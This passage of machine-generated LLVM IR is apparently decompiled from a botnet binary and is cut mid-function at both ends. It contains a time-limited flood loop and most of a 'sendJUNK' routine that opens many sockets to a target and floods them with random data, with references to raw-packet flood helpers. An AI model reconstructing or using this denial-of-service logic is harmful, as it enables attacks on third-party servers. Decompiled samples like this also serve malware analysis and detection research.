  %v1_804c12a = trunc i32 %v3_804c11f to i16
  store i16 %v1_804c12a, i16* %v4_804c053, align 2
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v10_804c131 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804c131, i1* %cf.global-to-local, align 1
  %v15_804c131 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804c134 = icmp eq i1 %v15_804c131, false
  br i1 %v1_804c134, label %dec_label_pc_804c153, label %dec_label_pc_804c136

dec_label_pc_804c136:                             ; preds = %dec_label_pc_804c072
  %v0_804c136 = load i32, i32* @esp, align 4
  %v1_804c136 = inttoptr i32 %v0_804c136 to i32*
  store i32 0, i32* %v1_804c136, align 4
  %v1_804c13d = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804c13d = call i32 @__GI_time(i32* %v1_804c13d)
  store i32 %v2_804c13d, i32* %eax.global-to-local, align 4
  %v10_804c142 = icmp ult i32 %v2_804c13d, %v5_804c063
  store i1 %v10_804c142, i1* %cf.global-to-local, align 1
  %v8_804c145 = icmp sgt i32 %v2_804c13d, %v5_804c063
  br i1 %v8_804c145, label %dec_label_pc_804c15b, label %dec_label_pc_804c072

dec_label_pc_804c153:                             ; preds = %dec_label_pc_804c072
  %v4_804c153 = add i32 %stack_var_-68.0, 1
  br label %dec_label_pc_804c072

dec_label_pc_804c15b:                             ; preds = %dec_label_pc_804c136, %dec_label_pc_804bc69, %dec_label_pc_804bc2c, %dec_label_pc_804bc0e
  %v0_804c165 = phi i32 [ %v5_804bc95, %dec_label_pc_804bc69 ], [ %v3_804bc56, %dec_label_pc_804bc2c ], [ %v3_804bc1e, %dec_label_pc_804bc0e ], [ %v2_804c13d, %dec_label_pc_804c136 ]
  store i32 %v0_804bbcd, i32* @ebx, align 4
  store i32 %v0_804bbcc, i32* @esi, align 4
  store i32 %v0_804bbcb, i32* @edi, align 4
  ret i32 %v0_804c165

; uselistorder directives
  uselistorder i32 %v3_804c11f, { 1, 0 }
  uselistorder i32 %v0_804c0fd, { 1, 0 }
  uselistorder i32 %v1_804c0d9, { 1, 0 }
  uselistorder i32 %v1_804c0bd, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_804c063, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804c05e, { 1, 0 }
  uselistorder i32 %v4_804c048, { 1, 0 }
  uselistorder i32 %v0_804c026, { 1, 0 }
  uselistorder i32 %v4_804c012, { 2, 1, 0 }
  uselistorder i32 %v1_804bffe, { 1, 0 }
  uselistorder i32 %v2_804bfc7, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i1 %v0_804bf67, { 1, 0 }
  uselistorder i32 %v7_804bf65, { 1, 0 }
  uselistorder i1 %v0_804bf13, { 1, 0 }
  uselistorder i32 %v7_804bf11, { 1, 0 }
  uselistorder i1 %v0_804bebc, { 1, 0 }
  uselistorder i32 %v7_804beba, { 1, 0 }
  uselistorder i1 %v0_804be71, { 1, 0 }
  uselistorder i32 %v7_804be6f, { 1, 0 }
  uselistorder i1 %v0_804be2c, { 1, 0 }
  uselistorder i32 %v7_804be2a, { 1, 0 }
  uselistorder i32 %v4_804be0c, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_-156.126, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-160.127, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804bf8f, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804bf7d, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_804bdb3, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804bd9d, { 1, 0 }
  uselistorder i32 %v7_804bd9b, { 1, 0 }
  uselistorder i32 %v2_804bd4a, { 1, 0 }
  uselistorder i32 %v1_804bd07, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %v2_804bcef, { 15, 14, 12, 13, 11, 10, 9, 27, 26, 25, 8, 7, 24, 6, 4, 5, 23, 22, 21, 20, 28, 19, 18, 17, 16, 2, 3, 1, 0 }
  uselistorder i32 %v1_804bccb, { 1, 0, 2 }
  uselistorder i32 %storemerge11, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804bcc1, { 1, 0 }
  uselistorder i32 %v3_804bc56, { 0, 2, 1, 5, 4, 3, 6, 7 }
  uselistorder i32 %v1_804bbfc, { 1, 0 }
  uselistorder i32 %v15_804bbce, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0 }
  uselistorder i32* %stack_var_-64, { 1, 2, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %eax.global-to-local, { 31, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 48, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 46, 47, 50, 49, 52, 51, 54, 53, 55, 56 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 3, 4, 20, 5, 6, 8, 7, 9, 11, 10, 12, 14, 13, 15, 17, 16, 18, 19, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @getRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 3, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c072, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c00f, { 1, 0 }
  uselistorder label %dec_label_pc_804bfa6, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804be0c, { 1, 0 }
  uselistorder label %dec_label_pc_804bcc8, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %dec_label_pc_804bc0e, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804c169 = load i32, i32* @edi, align 4
  %v0_804c16a = load i32, i32* @ebx, align 4
  store i32 %v0_804c16a, i32* %stack_var_-12, align 4
  %v12_804c16b = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_804c16b, i32* %eax.global-to-local, align 4
  %v1_804c179 = call i32 @getdtablesize(i32 %v12_804c16b)
  store i32 %v1_804c179, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804c179, 0
  %v2_804c182 = zext i1 %tmp to i32
  %v2_804c185 = add i32 %v2_804c182, %v1_804c179
  %v2_804c187 = sdiv i32 %v2_804c185, 2
  store i32 2, i32* %stack_var_-60, align 4
  %v1_804c195 = urem i32 %arg2, 65536
  store i32 %v1_804c195, i32* %eax.global-to-local, align 4
  store i32 %v1_804c195, i32* %stack_var_-236, align 4
  %v1_804c19b = trunc i32 %arg2 to i16
  %v2_804c19b = call i32 @htons(i16 %v1_804c19b)
  %v2_804c1a7 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-236, align 4
  %v3_804c1b7 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804c1b7, i32* %eax.global-to-local, align 4
  %v1_804c1bc = icmp eq i32 %v3_804c1b7, 0
  br i1 %v1_804c1bc, label %dec_label_pc_804c1c5, label %dec_label_pc_804c539

dec_label_pc_804c1c5:                             ; preds = %entry
  %v2_804c1db = mul i32 %v2_804c187, 8
  %v1_804c1e1 = add i32 %v2_804c1db, 30
  %v2_804c1e4 = and i32 %v1_804c1e1, -16
  %v0_804c1ea = load i32, i32* @esp, align 4
  %v2_804c1ea = sub i32 %v0_804c1ea, %v2_804c1e4
  %v1_804c1fc = add i32 %v2_804c1ea, 35
  %v2_804c1ff = and i32 %v1_804c1fc, -16
  %v2_804c21c = mul i32 %v2_804c187, 5
  store i32 %v2_804c21c, i32* %edx.global-to-local, align 4
  %v1_804c222 = inttoptr i32 %v2_804c1ff to i8*
  store i32 %v2_804c1ff, i32* @edi, align 4
  %v1_804c227 = and i32 %v1_804c1fc, -256
  store i32 %v1_804c227, i32* %eax.global-to-local, align 4
  %v5_804c229 = call i8* @_memset(i8* %v1_804c222, i32 %v1_804c227, i32 %v2_804c21c)
  %v0_804c22b = load i32, i32* @esp, align 4
  %v1_804c22b = inttoptr i32 %v0_804c22b to i32*
  store i32 1024, i32* %v1_804c22b, align 4
  %v1_804c232 = call i32 @malloc(i32 %v2_804c1ff)
  store i32 %v1_804c232, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804c244 = load i32, i32* @esp, align 4
  %v2_804c244 = add i32 %v1_804c244, 8
  %v3_804c244 = inttoptr i32 %v2_804c244 to i32*
  store i32 1024, i32* %v3_804c244, align 4
  %v0_804c248 = load i32, i32* @esp, align 4
  %v1_804c248 = add i32 %v0_804c248, 4
  %v2_804c248 = inttoptr i32 %v1_804c248 to i32*
  store i32 0, i32* %v2_804c248, align 4
  %v0_804c250 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c250 = load i32, i32* @esp, align 4
  %v2_804c250 = inttoptr i32 %v1_804c250 to i32*
  store i32 %v0_804c250, i32* %v2_804c250, align 4
  %v3_804c253 = inttoptr i32 %v1_804c232 to i8*
  %v4_804c253 = call i32 @__GI_memset(i8* %v3_804c253, i32 %tmp7, i32 %tmp4)
  store i32 %v4_804c253, i32* %eax.global-to-local, align 4
  %v0_804c258 = load i32, i32* @esp, align 4
  %v1_804c258 = inttoptr i32 %v0_804c258 to i32*
  store i32 0, i32* %v1_804c258, align 4
  %v1_804c25f = inttoptr i32 %v1_804c232 to i32*
  %v2_804c25f = call i32 @__GI_time(i32* %v1_804c25f)
  %v5_804c264 = add i32 %v2_804c25f, %arg3
  store i32 %v5_804c264, i32* %eax.global-to-local, align 4
  %v3_804c281 = or i32 %v2_804c1ff, 4
  %v2_804c385 = ptrtoint i32* %stack_var_-188 to i32
  %tmp31 = bitcast i32* %stack_var_-188 to i8*
  %v2_804c3d6 = ptrtoint i32* %stack_var_-196 to i32
  %v2_804c41e = ptrtoint i32* %stack_var_-200 to i32
  %v2_804c428 = ptrtoint i32* %stack_var_-204 to i32
  %v16_804c51b38 = icmp sgt i32 %v2_804c185, 1
  br label %dec_label_pc_804c524

dec_label_pc_804c27b:                             ; preds = %dec_label_pc_804c518.preheader, %dec_label_pc_804c515
  %storemerge41 = phi i32 [ %v4_804c515, %dec_label_pc_804c515 ], [ 0, %dec_label_pc_804c518.preheader ]
  %stack_var_-192.140 = phi i32 [ %stack_var_-192.0, %dec_label_pc_804c515 ], [ %stack_var_-192.2, %dec_label_pc_804c518.preheader ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %edx.global-to-local, align 4
  %v2_804c281 = mul i32 %storemerge41, 8
  %v4_804c281 = add i32 %v2_804c281, %v3_804c281
  %v5_804c281 = inttoptr i32 %v4_804c281 to i8*
  %v6_804c281 = load i8, i8* %v5_804c281, align 4
  %v7_804c281 = zext i8 %v6_804c281 to i32
  store i32 %v7_804c281, i32* %eax.global-to-local, align 4
  %v8_804c28f = icmp eq i8 %v6_804c281, 0
  %v12_804c28f = icmp eq i8 %v6_804c281, 1
  br i1 %v12_804c28f, label %dec_label_pc_804c37b, label %dec_label_pc_804c29c

dec_label_pc_804c29c:                             ; preds = %dec_label_pc_804c27b
  %v12_804c29c = icmp eq i8 %v6_804c281, 2
  br i1 %v12_804c29c, label %dec_label_pc_804c4ad, label %dec_label_pc_804c2a9

dec_label_pc_804c2a9:                             ; preds = %dec_label_pc_804c29c
  br i1 %v8_804c28f, label %dec_label_pc_804c2b7, label %dec_label_pc_804c515

dec_label_pc_804c2b7:                             ; preds = %dec_label_pc_804c2a9
  store i32 %storemerge41, i32* @ebx, align 4
  %v0_804c2ba = load i32, i32* @esp, align 4
  %v1_804c2ba = add i32 %v0_804c2ba, 8
  %v2_804c2ba = inttoptr i32 %v1_804c2ba to i32*
  store i32 0, i32* %v2_804c2ba, align 4
  %v0_804c2c2 = load i32, i32* @esp, align 4
  %v1_804c2c2 = add i32 %v0_804c2c2, 4
  %v2_804c2c2 = inttoptr i32 %v1_804c2c2 to i32*
  store i32 1, i32* %v2_804c2c2, align 4
  %v0_804c2ca = load i32, i32* @esp, align 4
  %v1_804c2ca = inttoptr i32 %v0_804c2ca to i32*
  store i32 2, i32* %v1_804c2ca, align 4
  %v2_804c2d1 = load i32, i32* %stack_var_-204, align 4
  %v3_804c2d1 = call i32 @socket(i32 %v7_804c281, i32 %v12_804c16b, i32 %v2_804c2d1)
  %v2_804c2db = load i32, i32* @ebx, align 4
  %v3_804c2db = mul i32 %v2_804c2db, 8
  %v4_804c2db = add i32 %v3_804c2db, %v2_804c1ff
  %v5_804c2db = inttoptr i32 %v4_804c2db to i32*
  store i32 %v3_804c2d1, i32* %v5_804c2db, align 8
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v3_804c2e4 = add i32 %v2_804c281, %v2_804c1ff
  %v4_804c2e4 = inttoptr i32 %v3_804c2e4 to i32*
  %v5_804c2e4 = load i32, i32* %v4_804c2e4, align 8
  store i32 %v5_804c2e4, i32* %eax.global-to-local, align 4
  %v0_804c2e7 = load i32, i32* @esp, align 4
  %v1_804c2e7 = add i32 %v0_804c2e7, 8
  %v2_804c2e7 = inttoptr i32 %v1_804c2e7 to i32*
  store i32 0, i32* %v2_804c2e7, align 4
  %v0_804c2ef = load i32, i32* @esp, align 4
  %v1_804c2ef = add i32 %v0_804c2ef, 4
  %v2_804c2ef = inttoptr i32 %v1_804c2ef to i32*
  store i32 3, i32* %v2_804c2ef, align 4
  %v0_804c2f7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c2f7 = load i32, i32* @esp, align 4
  %v2_804c2f7 = inttoptr i32 %v1_804c2f7 to i32*
  store i32 %v0_804c2f7, i32* %v2_804c2f7, align 4
  %v2_804c2fa = load i32, i32* %stack_var_-204, align 4
  %v3_804c2fa = call i32 @__libc_fcntl(i32 %v7_804c281, i32 %v12_804c16b, i32 %v2_804c2fa)
  %v1_804c301 = or i32 %v3_804c2fa, 2048
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v5_804c30d = load i32, i32* %v4_804c2e4, align 8
  store i32 %v5_804c30d, i32* %eax.global-to-local, align 4
  %v1_804c310 = load i32, i32* @esp, align 4
  %v2_804c310 = add i32 %v1_804c310, 8
  %v3_804c310 = inttoptr i32 %v2_804c310 to i32*
  store i32 %v1_804c301, i32* %v3_804c310, align 4
  %v0_804c314 = load i32, i32* @esp, align 4
  %v1_804c314 = add i32 %v0_804c314, 4
  %v2_804c314 = inttoptr i32 %v1_804c314 to i32*
  store i32 4, i32* %v2_804c314, align 4
  %v0_804c31c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c31c = load i32, i32* @esp, align 4
  %v2_804c31c = inttoptr i32 %v1_804c31c to i32*
  store i32 %v0_804c31c, i32* %v2_804c31c, align 4
  %v2_804c31f = load i32, i32* %stack_var_-204, align 4
  %v3_804c31f = call i32 @__libc_fcntl(i32 %v7_804c281, i32 %v12_804c16b, i32 %v2_804c31f)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v5_804c32d = load i32, i32* %v4_804c2e4, align 8
  store i32 %v5_804c32d, i32* %eax.global-to-local, align 4
  %v0_804c330 = load i32, i32* @esp, align 4
  %v1_804c330 = add i32 %v0_804c330, 8
  %v2_804c330 = inttoptr i32 %v1_804c330 to i32*
  store i32 16, i32* %v2_804c330, align 4
  %v1_804c338 = load i32, i32* @esp, align 4
  %v2_804c338 = add i32 %v1_804c338, 4
  %v3_804c338 = inttoptr i32 %v2_804c338 to i32*
  store i32 %v2_804c1a7, i32* %v3_804c338, align 4
  %v0_804c33c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c33c = load i32, i32* @esp, align 4
  %v2_804c33c = inttoptr i32 %v1_804c33c to i32*
  store i32 %v0_804c33c, i32* %v2_804c33c, align 4
  %v2_804c33f = load i32, i32* %stack_var_-204, align 4
  %v3_804c33f = call i32 @__libc_connect(i32 %v7_804c281, i32 %v12_804c16b, i32 %v2_804c33f)
  store i32 %v3_804c33f, i32* %eax.global-to-local, align 4
  %v10_804c344 = icmp eq i32 %v3_804c33f, -1
  %v1_804c347 = icmp eq i1 %v10_804c344, false
  br i1 %v1_804c347, label %dec_label_pc_804c355, label %dec_label_pc_804c349

dec_label_pc_804c349:                             ; preds = %dec_label_pc_804c2b7
  %v1_804c349 = call i32 @__errno_location(i32 %v7_804c281)
  store i32 %v1_804c349, i32* %eax.global-to-local, align 4
  %v1_804c34e = inttoptr i32 %v1_804c349 to i32*
  %v2_804c34e = load i32, i32* %v1_804c34e, align 4
  store i32 %v2_804c34e, i32* %eax.global-to-local, align 4
  %v9_804c350 = icmp eq i32 %v2_804c34e, 115
  br i1 %v9_804c350, label %dec_label_pc_804c36b, label %dec_label_pc_804c355

dec_label_pc_804c355:                             ; preds = %dec_label_pc_804c349, %dec_label_pc_804c2b7
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %edx.global-to-local, align 4
  %v5_804c35b = load i32, i32* %v4_804c2e4, align 8
  store i32 %v5_804c35b, i32* %eax.global-to-local, align 4
  %v1_804c35e = load i32, i32* @esp, align 4
  %v2_804c35e = inttoptr i32 %v1_804c35e to i32*
  store i32 %v5_804c35b, i32* %v2_804c35e, align 4
  %v1_804c361 = call i32 @__libc_close(i32 %v7_804c281)
  store i32 %v1_804c361, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c515

dec_label_pc_804c36b:                             ; preds = %dec_label_pc_804c349
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804c281, align 4
  br label %dec_label_pc_804c515

dec_label_pc_804c37b:                             ; preds = %dec_label_pc_804c27b
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c385, i32* @edi, align 4
  %v5_804c38c = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v3_804c39a = add i32 %v2_804c281, %v2_804c1ff
  %v4_804c39a = inttoptr i32 %v3_804c39a to i32*
  %v5_804c39a = load i32, i32* %v4_804c39a, align 8
  %v2_804c39f = udiv i32 %v5_804c39a, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v5_804c3a8 = load i32, i32* %v4_804c39a, align 8
  %v1_804c3ab = urem i32 %v5_804c3a8, 32
  store i32 %v1_804c3ab, i32* %eax.global-to-local, align 4
  %v0_804c3ae = load i32, i32* @ebp, align 4
  %v2_804c3ae = mul nuw nsw i32 %v2_804c39f, 4
  %v3_804c3ae = add nsw i32 %v2_804c3ae, -184
  %v4_804c3ae = add i32 %v3_804c3ae, %v0_804c3ae
  %v5_804c3ae = inttoptr i32 %v4_804c3ae to i32*
  %v6_804c3ae = load i32, i32* %v5_804c3ae, align 4
  %v9_804c3ae = shl i32 1, %v1_804c3ab
  %v12_804c3ae = or i32 %v6_804c3ae, %v9_804c3ae
  store i32 %v12_804c3ae, i32* %v5_804c3ae, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v5_804c3d0 = load i32, i32* %v4_804c39a, align 8
  %v1_804c3d3 = add i32 %v5_804c3d0, 1
  store i32 %v1_804c3d3, i32* %edx.global-to-local, align 4
  %v1_804c3dc = load i32, i32* @esp, align 4
  %v2_804c3dc = add i32 %v1_804c3dc, 16
  %v3_804c3dc = inttoptr i32 %v2_804c3dc to i32*
  store i32 %v2_804c3d6, i32* %v3_804c3dc, align 4
  %v0_804c3e0 = load i32, i32* @esp, align 4
  %v1_804c3e0 = add i32 %v0_804c3e0, 12
  %v2_804c3e0 = inttoptr i32 %v1_804c3e0 to i32*
  store i32 0, i32* %v2_804c3e0, align 4
  store i32 %v2_804c385, i32* %eax.global-to-local, align 4
  %v1_804c3ee = load i32, i32* @esp, align 4
  %v2_804c3ee = add i32 %v1_804c3ee, 8
  %v3_804c3ee = inttoptr i32 %v2_804c3ee to i32*
  store i32 %v2_804c385, i32* %v3_804c3ee, align 4
  %v0_804c3f2 = load i32, i32* @esp, align 4
  %v1_804c3f2 = add i32 %v0_804c3f2, 4
  %v2_804c3f2 = inttoptr i32 %v1_804c3f2 to i32*
  store i32 0, i32* %v2_804c3f2, align 4
  %v0_804c3fa = load i32, i32* %edx.global-to-local, align 4
  %v1_804c3fa = load i32, i32* @esp, align 4
  %v2_804c3fa = inttoptr i32 %v1_804c3fa to i32*
  store i32 %v0_804c3fa, i32* %v2_804c3fa, align 4
  %v0_804c3fd = load i32, i32* %stack_var_-196, align 4
  %v2_804c3fd = load i32, i32* %stack_var_-188, align 4
  %v5_804c3fd = call i32 @__libc_select(i32 %v0_804c3fd, i32 10000, i32 %v2_804c3fd, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c3fd, i32* %eax.global-to-local, align 4
  %v12_804c405 = icmp eq i32 %v5_804c3fd, 1
  %v1_804c409 = icmp eq i1 %v12_804c405, false
  br i1 %v1_804c409, label %dec_label_pc_804c485, label %dec_label_pc_804c40b

dec_label_pc_804c40b:                             ; preds = %dec_label_pc_804c37b
  store i32 4, i32* %stack_var_-200, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v5_804c41b = load i32, i32* %v4_804c39a, align 8
  store i32 %v5_804c41b, i32* %edx.global-to-local, align 4
  %v1_804c424 = load i32, i32* @esp, align 4
  %v2_804c424 = add i32 %v1_804c424, 16
  %v3_804c424 = inttoptr i32 %v2_804c424 to i32*
  store i32 %v2_804c41e, i32* %v3_804c424, align 4
  store i32 %v2_804c428, i32* %eax.global-to-local, align 4
  %v1_804c42e = load i32, i32* @esp, align 4
  %v2_804c42e = add i32 %v1_804c42e, 12
  %v3_804c42e = inttoptr i32 %v2_804c42e to i32*
  store i32 %v2_804c428, i32* %v3_804c42e, align 4
  %v0_804c432 = load i32, i32* @esp, align 4
  %v1_804c432 = add i32 %v0_804c432, 8
  %v2_804c432 = inttoptr i32 %v1_804c432 to i32*
  store i32 4, i32* %v2_804c432, align 4
  %v0_804c43a = load i32, i32* @esp, align 4
  %v1_804c43a = add i32 %v0_804c43a, 4
  %v2_804c43a = inttoptr i32 %v1_804c43a to i32*
  store i32 1, i32* %v2_804c43a, align 4
  %v0_804c442 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c442 = load i32, i32* @esp, align 4
  %v2_804c442 = inttoptr i32 %v1_804c442 to i32*
  store i32 %v0_804c442, i32* %v2_804c442, align 4
  %v0_804c445 = load i32, i32* %stack_var_-200, align 4
  %v1_804c445 = load i32, i32* %stack_var_-196, align 4
  %v3_804c445 = load i32, i32* %stack_var_-188, align 4
  %v5_804c445 = call i32 @getsockopt(i32 %v0_804c445, i32 %v1_804c445, i32 10000, i32 %v3_804c445, i32 ptrtoint (i32* @0 to i32))
  %v3_804c44a = load i32, i32* %stack_var_-204, align 4
  %v1_804c450 = icmp eq i32 %v3_804c44a, 0
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  br i1 %v1_804c450, label %dec_label_pc_804c475, label %dec_label_pc_804c454

dec_label_pc_804c454:                             ; preds = %dec_label_pc_804c40b
  %v5_804c45a = load i32, i32* %v4_804c39a, align 8
  store i32 %v5_804c45a, i32* %eax.global-to-local, align 4
  %v1_804c45d = load i32, i32* @esp, align 4
  %v2_804c45d = inttoptr i32 %v1_804c45d to i32*
  store i32 %v5_804c45a, i32* %v2_804c45d, align 4
  %v0_804c460 = load i32, i32* %stack_var_-200, align 4
  %v1_804c460 = call i32 @__libc_close(i32 %v0_804c460)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804c281, align 4
  br label %dec_label_pc_804c515

dec_label_pc_804c475:                             ; preds = %dec_label_pc_804c40b
  store i8 2, i8* %v5_804c281, align 4
  br label %dec_label_pc_804c515

dec_label_pc_804c485:                             ; preds = %dec_label_pc_804c37b
  %v13_804c485 = icmp eq i32 %v5_804c3fd, -1
  %v1_804c489 = icmp eq i1 %v13_804c485, false
  br i1 %v1_804c489, label %dec_label_pc_804c515, label %dec_label_pc_804c48f

dec_label_pc_804c48f:                             ; preds = %dec_label_pc_804c485
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v5_804c495 = load i32, i32* %v4_804c39a, align 8
  store i32 %v5_804c495, i32* %eax.global-to-local, align 4
  %v1_804c498 = load i32, i32* @esp, align 4
  %v2_804c498 = inttoptr i32 %v1_804c498 to i32*
  store i32 %v5_804c495, i32* %v2_804c498, align 4
  %v1_804c49b = call i32 @__libc_close(i32 %v5_804c3fd)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804c281, align 4
  br label %dec_label_pc_804c515

dec_label_pc_804c4ad:                             ; preds = %dec_label_pc_804c29c
  %v0_804c4ad = load i32, i32* @esp, align 4
  %v1_804c4ad = add i32 %v0_804c4ad, 4
  %v2_804c4ad = inttoptr i32 %v1_804c4ad to i32*
  store i32 1024, i32* %v2_804c4ad, align 4
  store i32 %v1_804c232, i32* %eax.global-to-local, align 4
  %v1_804c4b8 = load i32, i32* @esp, align 4
  %v2_804c4b8 = inttoptr i32 %v1_804c4b8 to i32*
  store i32 %v1_804c232, i32* %v2_804c4b8, align 4
  %v2_804c4bb = inttoptr i32 %v7_804c281 to i8*
  %v3_804c4bb = call i32 @makeRandomStr(i8* %v2_804c4bb, i32 %v12_804c16b)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v3_804c4c6 = add i32 %v2_804c281, %v2_804c1ff
  %v4_804c4c6 = inttoptr i32 %v3_804c4c6 to i32*
  %v5_804c4c6 = load i32, i32* %v4_804c4c6, align 8
  store i32 %v5_804c4c6, i32* %edx.global-to-local, align 4
  %v0_804c4c9 = load i32, i32* @esp, align 4
  %v1_804c4c9 = add i32 %v0_804c4c9, 12
  %v2_804c4c9 = inttoptr i32 %v1_804c4c9 to i32*
  store i32 16384, i32* %v2_804c4c9, align 4
  %v0_804c4d1 = load i32, i32* @esp, align 4
  %v1_804c4d1 = add i32 %v0_804c4d1, 8
  %v2_804c4d1 = inttoptr i32 %v1_804c4d1 to i32*
  store i32 1024, i32* %v2_804c4d1, align 4
  store i32 %v1_804c232, i32* %eax.global-to-local, align 4
  %v1_804c4dc = load i32, i32* @esp, align 4
  %v2_804c4dc = add i32 %v1_804c4dc, 4
  %v3_804c4dc = inttoptr i32 %v2_804c4dc to i32*
  store i32 %v1_804c232, i32* %v3_804c4dc, align 4
  %v0_804c4e0 = load i32, i32* %edx.global-to-local, align 4
